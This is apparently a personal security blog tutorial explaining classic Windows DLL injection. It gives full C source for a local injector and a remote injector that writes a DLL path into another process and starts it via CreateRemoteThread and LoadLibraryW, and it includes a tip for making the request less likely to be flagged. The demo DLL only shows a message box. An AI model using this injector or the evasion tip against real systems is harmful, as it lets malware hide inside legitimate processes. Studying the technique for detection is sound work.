+++
title = "An overview of DLL injection"
draft = false
tags = ["Dll-Injection"]
categories = ["Malware"]
ShowToc = true
author = ["connar"]
+++

<style>
	fieldset {
		background: url('/img/test.gif') no-repeat center center;
		background-size: cover;
		border: 1px solid #ccc;
		padding: 10px;
		position: relative;
		z-index: 2;
		color: #dcdcdc;
		font-weight: 500;
	}
</style> 


## Intro
When I was learning about API Hashing, I had touched upon a topic named **DLL Unlinking**. This topic really excited me as it was a simple topic but yet it could go in length of how to detect it using VAD trees amongst other ways.  

Before I could proceed in experimenting with this topic though, I had to first learn how to do DLL Injection since DLL Unlinking is related to that.  

So basically this post will be just that: **Learning DLL Injection**! 

## What is DLL Injection
DLL Injection is a technique that exists for a while now and is used by malware, where a malicious process injects a DLL existing on the disk into a target (and legitimate) process.  

Basically, processes use DLL's for their functionality, so the idea is to inject an "extra" DLL (which is malicious and definitely not needed by the process) into that legitimate process to try and go under the radar.  

There are many DLL injection techniques such as:  
- [Reflective DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection) 
- [DLL Search Order Hijack](https://dmcxblue.gitbook.io/red-team-notes/persistence/dll-search-order-hijacking)

I was just starting to learn about the simply DLL Injection technique so the examples shown will be about that.  

## Overview of how it works
The idea is we have a **target process** that we would like to inject a dll into:  

![](/posts/dllinjection/dllinjection1.png)  

Then we have an **injector process** that we initiate the injection procedure (basically the process that will inject the DLL into another process):  

![](/posts/dllinjection/dllinjection2.png)  

The first thing to do is to allocate memory to the target process address space and write the path of the dll into the target address space process.  

The reason for that is that we are going to use the ```CreateRemoteThread``` function to run the ```LoadLibrary``` api and ```LoadLibrary``` needs the path to the dll, so we have to put the path in the target process were the **remote thread** will run.  

Then we can create the **remote thread** in the **target process**, our thread will be pointed to the ```LoadLibrary``` function. It's going to call the ```LoadLibrary``` function using the dll path we wrote before and that would force the dll to be loaded into a **target process**:

![](/posts/dllinjection/dllinjection3.png)  

Then the injector process can simply go away as we dont need it anymore, and the dll will simply be there:  

![](/posts/dllinjection/dllinjection4.png)  

## Local vs Remote DLL Injection
I will first go through a simple **local DLL injection** to get a bit comfortable around the concept of the loaded path of the DLL that will be loaded into memory. When I say **local DLL injection**, I mean:  
- [Step 1]: Creating a DLL.
- [Step 2]: Creating an executable.
- [Step 3]: Running the executable and loading the DLL **into that running executable** we created on Step 2.

After we are comfortable around that, we will see how to inject the DLL not to a local process but to a remote one (**remote DLL Injection**). When I say **remote DLL Injection**, I mean:  
- [Step 1]: Creating a DLL.
- [Step 2]: Creating an executable.
- [Step 3]: Running the executable and loading the DLL **into some other process**, like notepad.exe for example.  

## Making a simple DLL
The DLL we will be injecting is the following:
```c
#include "pch.h"
#include "Windows.h"
#include "stdio.h"

VOID MsgBoxPayload() {
    MessageBoxA(NULL, "DLL Injected successfully:D", "Wow !", MB_OK | MB_ICONINFORMATION);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

    switch (dwReason) {
    case DLL_PROCESS_ATTACH: {
        MsgBoxPayload();
        break;
    };
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
```
This will simply call the MsgBoxPayload() function once the DLL is attached to a process (```DLL_PROCESS_ATTACH```).

## Local DLL Injection
To do a local DLL Injection, you simply just load the DLL into the running process created by your executable. To load the DLL, you just need to use ```LoadLibrary```:

```c
#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {
	
	// Check that an argument was passed
	if (argc < 2) {
		printf("[!] Missing Argument; Dll Payload To Run \n");
		return -1;
	}

	printf("[i] Injecting \"%s\" To The Local Process Of Pid: %d \n", argv[1], GetCurrentProcessId());

	// Get full path of the provided DLL
	char fullPath[MAX_PATH];
	DWORD pathLen = GetFullPathNameA(argv[1], MAX_PATH, fullPath, NULL);

	if (pathLen == 0 || pathLen > MAX_PATH) {
		printf("[!] Could not determine the full path for %s. Error: %d \n", argv[1], GetLastError());
		return;
	}

	// Load the DLL with LoadLibraryA
	printf("[+] Loading Dll... ");
	if (LoadLibraryA(fullPath) == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE ! \n");


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}
```

Now that we have our executable and the DLL ready for injection, let's open Process Hacker and then proceed to run our injector:  

![](/posts/dllinjection/dllinjection5.png)  

And we see that indeed our DLL - that is definitely not needed for the process created by our executable - is loaded in the Modules this process uses.  

Okay cool, but it would be really nice if we could use our executable to load the DLL not to the process created by our exe, but to a totally different process. **Here comes the remote DLL Injection**, so let's see how to do that!

## Remote DLL Injections
In the **remote DLL Injection**, we inject a DLL into a remote process. In order to do that though, we need the PID of the target process.  
Also, the target process we want to inject our DLL into might not be even running, so the first step in injecting DLL's in remote processes is to first enumerate the running processes on the system. 

As always, I will start by writting the code and explain each part as we develop it further. 

### Remote DLL Injection PoC
In the remote DLL Injection there is a lot more going on, but nothing too extreme. The code starts like the local DLL Injection where we need to get arguments from the user, specifically the dll we want to inject and the name of the process we want to inject our DLL into:  
```c
int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("[!] Usage: dll_injection.exe <dll_path> <target_process> \n");
		return -1;
	}

	char* dllPath = argv[1];
	char* targetProcessName = argv[2];

	printf("[#] Press <Enter> to exit...\n");
	getchar();

	return 0;
}
```
After we provide our DLL name and the target process name, we make some additional checks and convertions. Specifically: 
- We find the full path of the DLL. 
- We convert the target process name and the full DLL path to wide char.
	- The reason we convert to wide char is because the ```GetFullPathNameA``` will return an ```ANSI string```. Later we will pass that string to a method called ```InjectDllRemoteProcess``` which will work with ```LPWSTR```, so a proper convertion to ```wchar_t``` array is needed in order to avoid missing null terminations or wrong encoding.

So the code is updated with the following part:  
```c
...
// Convert target process name to wide characters.
WCHAR targetProcess[MAX_PATH];
MultiByteToWideChar(CP_ACP, 0, targetProcessName, -1, targetProcess, MAX_PATH);

printf("[i] DLL to inject: \"%s\"\n", dllPath);
printf("[i] Target process: \"%S\"\n", targetProcess);

// Get the absolute path of the DLL.
char fullPath[MAX_PATH];
DWORD pathLen = GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL);
if (pathLen == 0 || pathLen > MAX_PATH) {
	printf("[!] Could not determine full path for %s. Error: %d\n", dllPath, GetLastError());
	return -1;
}
printf("[i] Full DLL path resolved to: \"%s\"\n", fullPath);

// Convert DLL path to wide characters.
WCHAR wideFullPath[MAX_PATH];
MultiByteToWideChar(CP_ACP, 0, fullPath, -1, wideFullPath, MAX_PATH);
...
```

After we are done with our convertions, it is time to get a handle for the target process. Handle is a way to communicate with a resource. For example, when you open a file in python, you basically get a handle to that file. Without getting a handle we won't be able to make any other progress:  
```c
...
DWORD processId;
HANDLE hProcess;
if (!GetRemoteProcessHandle(targetProcess, &processId, &hProcess)) {
	printf("[!] Failed to find or access target process \"%S\".\n", targetProcess);
	return -1;
}
printf("[i] Process \"%S\" found with PID: %d\n", targetProcess, processId);
...
```

But how do we actually get a handle to the target process? Do we know if the process is even running on the victim's machine? And how do we find among all the running processes the one we are interested in?  

Answers to all these questions exist inside the GetRemoteProcessHandle function, so let's continue from there.

#### GetRemoteProcessHandle - Getting a handle to the target process
The goal of our ```BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess)``` is to find out if our target process exist, and if that is the case to return us a handle to that process along with its PID. So we must pass as parameters:  
- the target process name (the full path we converted earlier).
- the pointer to the processId which will be returned to us - if found.
- the pointer of the handle we will get of the process - if found.

The way this method works is by taking a snapshop of all the currently running processes of the machine with a function called ```CreateToolhelp32Snapshot``` and then just enumerating each one of them, comparing our target process name to the current one in the enumeration until it finds a match (or until the loop ends).

The part of the code that takes the snapshot is:  
```c
HANDLE hSnapShot = NULL;

// Capture a snapshot of all running processes.
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
if (hSnapShot == INVALID_HANDLE_VALUE) {
	printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
	goto _EndOfFunction;
}
```
In case you are wondering how to find the correct parameter to pass in ```CreateToolhelp32Snapshot``` like ```TH32CS_SNAPPROCESS```, you always must revise microsoft documentation:  

![](/posts/dllinjection/dllinjection6.png)  

Microsoft docs are so kind they let us know that in order to enumerate processes, we should see ```Process32First```. So let's continue with the utilization of this function and explain how we use it:  
```c
...
// Capture a snapshot of all running processes.
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
if (hSnapShot == INVALID_HANDLE_VALUE) {
	printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
	goto _EndOfFunction;
}

PROCESSENTRY32	Proc = {
	.dwSize = sizeof(PROCESSENTRY32)
};

// Get details of the first process from the snapshot.
if (!Process32First(hSnapShot, &Proc)) {
	printf("[!] Process32First Failed With Error : %d \n", GetLastError());
	goto _EndOfFunction;
}

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;

...
```
As I mentioned previously, we would get a snapshot of the current running processes of the machine and then enumerate them. As the microsoft docs advised us, we should use ```Process32First``` for the enumeration. But what are the parameters passed to this function and why did we change the ```dwSize``` of the struct ```PROCESSENTRY32``` of the ```Proc``` struct?  

The parameters passed are:  
- ```hSnapShot```: This was the returned value from ```CreateToolhelp32Snapshot``` which is basically the handle to all the current running processes.  
- ```&Proc```: This is a pointer to a ```PROCESSENTRY32``` struct. Why? Well, because processes in Windows are of that type, so basically we tell ```Process32First``` to look into the current running processes that are of type ```PROCESSENTRY32``` so it knows how to handle and enumerate them.  

We can also advise microsoft docs on how to use a function, and in this case we should in order to understand why we modify the ```dwSize``` value of that struct:  

![](/posts/dllinjection/dllinjection7.png)  

Now that these are clear, let's start the enumeration:  
```c
do {
	WCHAR LowerName[MAX_PATH * 2];

	if (Proc.szExeFile) {
		DWORD dwSize = lstrlenW(Proc.szExeFile);
		DWORD i = 0;

		// overwrite LowerName with zero's
		RtlSecureZeroMemory(LowerName, sizeof(LowerName));

		// Convert Proc.szExeFile to lowercase and store in LowerName.
		if (dwSize < MAX_PATH * 2) {
			for (; i < dwSize; i++)
				LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

			LowerName[i++] = '\0';
		}
	}

	// Check if the process name matches the target process.
	if (wcscmp(LowerName, szProcessName) == 0) {
		*dwProcessId = Proc.th32ProcessID; // Save PID.
		*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle.
		if (*hProcess == NULL)
			printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

		break;
	}

	// Move to the next process in the snapshot.
} while (Process32Next(hSnapShot, &Proc));
```
The enumeration does the following three steps:
- [Step 1]: It declares - and overrites in everyloop - a variable to store the current process name.
- [Step 2]: Converts name of the current process to lowercase.
- [Step 3]: Compares the lowercase name with the targetProcess name.
	- [Step 3.1]: If a match is found, a handle is returned for that process.

Let's see each one of the steps more in depth.

##### Process enumeration - [Step 1]
In Step 1, we declare a variable to store the name of the current process in each iteration, and then we overrite it with zero's to clear its memory:
```c
WCHAR LowerName[MAX_PATH * 2];

if (Proc.szExeFile) {
	DWORD	dwSize = lstrlenW(Proc.szExeFile);
	DWORD   i = 0;

	// overwrite LowerName with zero's
	RtlSecureZeroMemory(LowerName, sizeof(LowerName));
```
Basically, if ```Proc.szExeFile``` exists, we get its size based on the name, which we get from the ```PROCESSENTRY32``` struct member ```szExeFile```. We can see that from microsoft docs as well:  

![](/posts/dllinjection/dllinjection8.png)  

Then, we ideally want to clean the memory that the previous loaded process name was stored, so we use ```RtlSecureZeroMemory``` for this:  

![](/posts/dllinjection/dllinjection9.png)  

##### Process enumeration - [Step 2]
In Step 2, we basically get each character of the ```szExeFile``` member and convert it to lowercase, also casting it to ```WCHAR``` type. This is because the target process name is passed as lowercase and is also of type ```WCHAR```, so we want the currently enumerated process to be in the same format in order to compare it with the target one:
```c
if (dwSize < MAX_PATH * 2) {
	for (; i < dwSize; i++)
		LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

	LowerName[i++] = '\0';
}
```

### Process enumeration - [Step 3]
In Step 3, we compare the current process name with the target one. If a match is found, we store its process ID, and then we try to get a handle to that process with ```OpenProcess```:
```c
...
	// Check if the process name matches the target process.
	if (wcscmp(LowerName, szProcessName) == 0) {
		*dwProcessId = Proc.th32ProcessID; // Save PID.
		*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle.
		if (*hProcess == NULL)
			printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

		break;
	}

	// Move to the next process in the snapshot.
} while (Process32Next(hSnapShot, &Proc));
```
We can always look the microsoft docs to understand why we pass these values in the ```OpenProcess```, but here is the syntax of it:  
```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
<fieldset class="fieldset-wrapper">
	<center><legend><b>Note</b></legend></center><br>
	<p><b>A more stealthy approach for the dwDesiredAccess value would be PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD instead of PROCESS_ALL_ACCESS.</b></p>
	<p><b>This is why PROCESS_ALL_ACCESS is really noisy as it asks for all possible access permisions, while the other approach asks for only what is needed.</b></p>
	<p><b>This could result in flagging the script as malware more easily, but since this is just a PoC, we can ignore it for now.</b></p>
</fieldset>


If a handle is returned back successfully, the loop ends. If not, the corresponding error is printed on the screen and if no match was found in the first place, the enumeration continues with ```Process32Next```.

#### InjectDllRemoteProcess - Injecting the DLL to the remote process
After the ```GetRemoteProcessHandle``` function is finished and we have gotten back a handle to the target process, it is time to inject our DLL into that process. All we need is a handle to that process and the path to our DLL to inject:  
```c
// Inject the DLL into the target process.
if (!InjectDllToRemoteProcess(hProcess, wideFullPath)) {
	printf("[!] DLL injection failed.\n");
	CloseHandle(hProcess);
	return -1;
}
```

Let's dive into this function responsible for the injection:
```c
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
	BOOL bSTATE = TRUE;
	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddress = NULL;

	// Calculate size of the DLL path in bytes (including null terminator).
	DWORD dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR);

	SIZE_T lpNumberOfBytesWritten = NULL;
	HANDLE hThread = NULL;

	// Fetch LoadLibraryW address from kernel32.dll.
	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocate memory in the target process.
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	// Write the DLL name to the allocated memory in the target process.
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	// Create a remote thread to execute LoadLibraryW in the target process.
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	// Close thread handle after execution.
	CloseHandle(hThread);
	return TRUE;
}
```

This function basically takes as arguments only what is needed for the DLL Injection:
- ```hProcess```: the process handle we want to inject the dll into.
- ```DllName```: The dll we want to inject into the process.

The most important parts that we must highlight are the following:  

```c
pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
```
This part of the code retrieves the address of the LoadLibraryW function from kernel32.dll using the GetModuleHandle and GetProcAddress functions.

<fieldset class="fieldset-wrapper">
	<center><legend><b>Note</b></legend></center><br>
	<p><b>This is possible because kernel32.dll is loaded into every process, and its base address is consistent across all processes on a given system during a single boot session (due to how Windows implements ASLR for certain system libraries).</b></p>
	<p><b>Even though ASLR randomizes the base address of kernel32.dll after every system reboot, during any single boot, all processes will have the same base address for this module. This allows us to calculate the address of the LoadLibraryW within kernel32.dll in our process and based on the address we find, use the same one for the remote target process we want to inject the dll into. This technique leverages the shared base address of kernel32.dll across processes, allowing us to locate Windows API libraries in different processes.</b></p>
</fieldset>

The next part of the code that is of importance is:  
```c
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

This line allocates memory using the VirtualAllocEx API, to allocate memory in a different process tham our own process. 

The structure of VirtualAllocEx is the following:  
```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,			// handle to the process we want to allocate memory.
  [in, optional] LPVOID lpAddress,			// desired starting address - we don't really care.
  [in]           SIZE_T dwSize,				// size of the path of the DLL to be injected.
  [in]           DWORD  flAllocationType,	// memory allocation type.
  [in]           DWORD  flProtect			// page protection - the page that was previously specified in flAllocationType.
);
```

**flAllocationType**: For the allocation type we used ```MEM_COMMIT | MEM_RESERVE``` in order to reverse a chunk of the target process and commit it immediately.

**flProtect**: For the protection of the page that was reserved and commited, we use ```PAGE_READWRITE``` for read and write, otherwise ```WriteProcessMemory``` (we will see this shortly) won't be able to write, and ```LoadLibraryW``` wouldn't be able to read.  

After the memory has been successfully allocated in the remote target process, we now need to write to the allocated buffer (the reserved and commited page). We will use the ```WriteProcessMemory``` for that purpose in order to write the DLL's path/name in the allocated memory.  

The structure of the ```WriteProcessMemory``` is the following:  
```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               // A handle to the process whose memory to be written to
  [in]  LPVOID  lpBaseAddress,          // Base address in the specified process to which data is written
  [in]  LPCVOID lpBuffer,               // A pointer to the buffer that contains data to be written to 'lpBaseAddress'
  [in]  SIZE_T  nSize,                  // The number of bytes to be written to the specified process.	
  [out] SIZE_T  *lpNumberOfBytesWritten // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written
);
```
We therefore use this API in order to write the Dll path/name to the ```pAddress``` of the ```hProcess``` (the address returned from the previous memory allocation inside the remote target process):  
```c
if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite)
```
If everything is correct, then by now we should have:  
- allocated memory into the remote target process.
- written the dll path/name inside that allocated memory.

Only thing that is left to do is create a remote thread into that process which will basically just load the path/name of the dll written into that address, resulting in its execution!

Based on that, the last line of interest is:  
```c
hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
```
The ```CreateRemoteThread``` API creates a remote thread inside the ```hProcess``` (the remote target process), and specifies to that thread that it should use the ```LoadLibraryW``` API to load whatever is inside ```pAddress``` (which is the path of the DLL written previously).  

Seeing that in action:  

![](/posts/dllinjection/dllinjection10.png)  

Until now, memory has been allocated into the remote target process. If we press Enter, the path of the dll will be written in that allocated memory. Let's open x64dbg to observe that:  

![](/posts/dllinjection/allocating_memory.gif)   

We observe that indeed the dll path has been loaded, but what about running it? Let's press one more Enter of the LoadLibraryW to take place and load that written dll path, resulting in its execution:  

![](/posts/dllinjection/loading_written_dll.gif)   

We once again see within Process Hacker that indeed our malicious dll has been loaded:  

![](/posts/dllinjection/dllinjection11.png)   

Overall, the whole code is:  
```c
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// Ensure the dwSize member is set correctly before using Process32First.
	PROCESSENTRY32 Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	// Capture a snapshot of all running processes.
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Get details of the first process from the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD dwSize = lstrlenW(Proc.szExeFile);
			DWORD i = 0;

			// overwrite LowerName with zero's
			RtlSecureZeroMemory(LowerName, sizeof(LowerName));

			// Convert Proc.szExeFile to lowercase and store in LowerName.
			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// Check if the process name matches the target process.
		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID; // Save PID.
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID); // Open process handle.
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Move to the next process in the snapshot.
	} while (Process32Next(hSnapShot, &Proc));

	// Clean up resources.
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
	BOOL bSTATE = TRUE;
	LPVOID pLoadLibraryW = NULL;
	LPVOID pAddress = NULL;

	// Calculate size of the DLL path in bytes (including null terminator).
	DWORD dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR);

	SIZE_T lpNumberOfBytesWritten = NULL;
	HANDLE hThread = NULL;

	// Fetch LoadLibraryW address from kernel32.dll.
	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocate memory in the target process.
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	// Write the DLL name to the allocated memory in the target process.
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	// Create a remote thread to execute LoadLibraryW in the target process.
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	// Close thread handle after execution.
	CloseHandle(hThread);
	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("[!] Usage: dll_injection.exe <dll_path> <target_process> \n");
		return -1;
	}

	char* dllPath = argv[1];
	char* targetProcessName = argv[2];

	// Convert target process name to wide characters.
	WCHAR targetProcess[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, targetProcessName, -1, targetProcess, MAX_PATH);

	printf("[i] DLL to inject: \"%s\"\n", dllPath);
	printf("[i] Target process: \"%S\"\n", targetProcess);

	// Get the absolute path of the DLL.
	char fullPath[MAX_PATH];
	DWORD pathLen = GetFullPathNameA(dllPath, MAX_PATH, fullPath, NULL);
	if (pathLen == 0 || pathLen > MAX_PATH) {
		printf("[!] Could not determine full path for %s. Error: %d\n", dllPath, GetLastError());
		return -1;
	}
	printf("[i] Full DLL path resolved to: \"%s\"\n", fullPath);

	// Convert DLL path to wide characters.
	WCHAR wideFullPath[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, fullPath, -1, wideFullPath, MAX_PATH);

	DWORD processId;
	HANDLE hProcess;
	if (!GetRemoteProcessHandle(targetProcess, &processId, &hProcess)) {
		printf("[!] Failed to find or access target process \"%S\".\n", targetProcess);
		return -1;
	}
	printf("[i] Process \"%S\" found with PID: %d\n", targetProcess, processId);

	// Inject the DLL into the target process.
	if (!InjectDllToRemoteProcess(hProcess, wideFullPath)) {
		printf("[!] DLL injection failed.\n");
		CloseHandle(hProcess);
		return -1;
	}

	printf("[+] DLL successfully injected into process \"%S\".\n", targetProcess);
	CloseHandle(hProcess);

	printf("[#] Press <Enter> to exit...\n");
	getchar();

	return 0;
}

```

**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://www.youtube.com/watch?v=0jX9UoXYLa4&t=1s">Pavel Yosifovich: <i>DLL Injection with CreateRemoteThread</i></a></li>
        <li> [2] <a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">Red Team Notes: <i>DLL Injection</i></a></li>
        <li> [3] <a href="https://www.youtube.com/watch?v=A6EKDAKBXPs&t=2984s">crow: <i>Malware Development: Process Injection</i></a></li>
        <li> [4] <a href="https://maldevacademy.com/">MalDev Academy</a></li>
</i></a></li>
    </ul>
</blockquote>